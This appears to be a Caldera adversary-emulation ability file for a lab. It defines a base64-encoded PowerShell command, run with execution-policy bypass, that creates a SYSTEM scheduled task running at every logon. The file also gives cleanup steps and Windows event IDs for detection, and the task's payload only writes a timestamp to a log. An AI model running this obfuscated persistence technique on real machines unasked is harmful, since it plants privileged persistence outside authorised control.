# bundles/spark/caldera-content/abilities/06-persistence/scheduled-task-logon.yml
- id: 9f83d684-8072-5681-92c0-45ba474fdab6
  name: "Scheduled Task onlogon"
  description: "Creates a SYSTEM scheduled task (PhantomMaintenance) that runs at every user logon. Lab-safe: payload appends a timestamp to a log file. Cleanup: schtasks /delete /tn PhantomMaintenance /f. T1053.005. Detection: Security 4698 + Microsoft-Windows-TaskScheduler/Operational 106."
  tactic: persistence
  technique:
    attack_id: T1053.005
    name: "Scheduled Task/Job: Scheduled Task"
  platforms:
    windows:
      psh:
        command: powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAEMAbwBuAHQAaQBuAHUAZQAiAAoAJAB0AGEAcwBrAE4AYQBtAGUAIAA9ACAAIgBQAGgAYQBuAHQAbwBtAE0AYQBpAG4AdABlAG4AYQBuAGMAZQAiAAoAJAB0AHIAIAA9ACAAJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAE4AbwBQAHIAbwBmAGkAbABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0AQwBvAG0AbQBhAG4AZAAgACIAQQBkAGQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABwAGgAYQBuAHQAbwBtAC0AdABhAHMAawAuAGwAbwBnACAALQBWAGEAbAB1AGUAIAAoAFwAIgBsAG8AZwBvAG4AOgAgAFwAIgAgACsAIAAoAEcAZQB0AC0ARABhAHQAZQAgAC0ARgBvAHIAbQBhAHQAIABvACkAKQAiACcACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIAPQA9AD0AIABFAHgAaQBzAHQAaQBuAGcAIABzAGMAaABlAGQAdQBsAGUAZAAgAHQAYQBzAGsAcwAgAG4AYQBtAGUAZAAgACcAJAB0AGEAcwBrAE4AYQBtAGUAJwAgACgAYgBlAGYAbwByAGUAKQAgAD0APQA9ACIACgAmACAAcwBjAGgAdABhAHMAawBzACAALwBxAHUAZQByAHkAIAAvAHQAbgAgACQAdABhAHMAawBOAGEAbQBlACAAMgA+ACYAMQAKAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAIgAiAAoAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAD0APQA9ACAARABlAGwAZQB0AGkAbgBnACAAYQBuAHkAIABlAHgAaQBzAHQAaQBuAGcAIAB0AGEAcwBrACAAdABvACAAbQBhAGsAZQAgAGkAZABlAG0AcABvAHQAZQBuAHQAIAA9AD0APQAiAAoAJgAgAHMAYwBoAHQAYQBzAGsAcwAgAC8AZABlAGwAZQB0AGUAIAAvAHQAbgAgACQAdABhAHMAawBOAGEAbQBlACAALwBmACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnAAoAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiACIACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIAPQA9AD0AIABDAHIAZQBhAHQAaQBuAGcAIABzAGMAaABlAGQAdQBsAGUAZAAgAHQAYQBzAGsAIAAvAHMAYwAgAG8AbgBsAG8AZwBvAG4AIAAvAHIAdQAgAFMAWQBTAFQARQBNACAALwByAGwAIABIAEkARwBIAEUAUwBUACAAKABUADEAMAA1ADMALgAwADAANQApACAAPQA9AD0AIgAKACQAbwB1AHQAIAA9ACAAJgAgAHMAYwBoAHQAYQBzAGsAcwAgAC8AYwByAGUAYQB0AGUAIAAvAHQAbgAgACQAdABhAHMAawBOAGEAbQBlACAALwB0AHIAIAAkAHQAcgAgAC8AcwBjACAAbwBuAGwAbwBnAG8AbgAgAC8AcgB1ACAAUwBZAFMAVABFAE0AIAAvAHIAbAAgAEgASQBHAEgARQBTAFQAIAAvAGYAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACQAbwB1AHQACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACIAIgAKAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAIgA9AD0APQAgAFYAZQByAGkAZgB5ACAAKABhAGYAdABlAHIAKQAgAD0APQA9ACIACgAkAHYAZQByAGkAZgB5ACAAPQAgACYAIABzAGMAaAB0AGEAcwBrAHMAIAAvAHEAdQBlAHIAeQAgAC8AdABuACAAJAB0AGEAcwBrAE4AYQBtAGUAIAAvAHYAIAAvAGYAbwAgAEwASQBTAFQAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgBXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAgACgAKAAkAHYAZQByAGkAZgB5ACAALQBzAHAAbABpAHQAIAAiAGAAbgAiACkAIAB8ACAAUwBlAGwAZQBjAHQALQBPAGIAagBlAGMAdAAgAC0ARgBpAHIAcwB0ACAAMgA1ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAIgBbACoAXQAgAFMAYwBoAGUAZAB1AGwAZQBkACAAdABhAHMAawAgAHAAZQByAHMAaQBzAHQAZQBuAGMAZQAgAGkAbgBzAHQAYQBsAGwAZQBkACAALQAtACAAZABlAHQAZQBjAHQAaQBvAG4AOgAgAFMAZQBjAHUAcgBpAHQAeQAgADQANgA5ADgAIAAoAHQAYQBzAGsAIABjAHIAZQBhAHQAZQBkACkAIAArACAANAA3ADAAMgAgACgAdABhAHMAawAgAHUAcABkAGEAdABlAGQAKQAsACAATQBpAGMAcgBvAHMAbwBmAHQALQBXAGkAbgBkAG8AdwBzAC0AVABhAHMAawBTAGMAaABlAGQAdQBsAGUAcgAvAE8AcABlAHIAYQB0AGkAbwBuAGEAbAAgADEAMAA2ACAAKAB0AGEAcwBrACAAcgBlAGcAaQBzAHQAZQByAGUAZAApACIACgA=
        timeout: 120
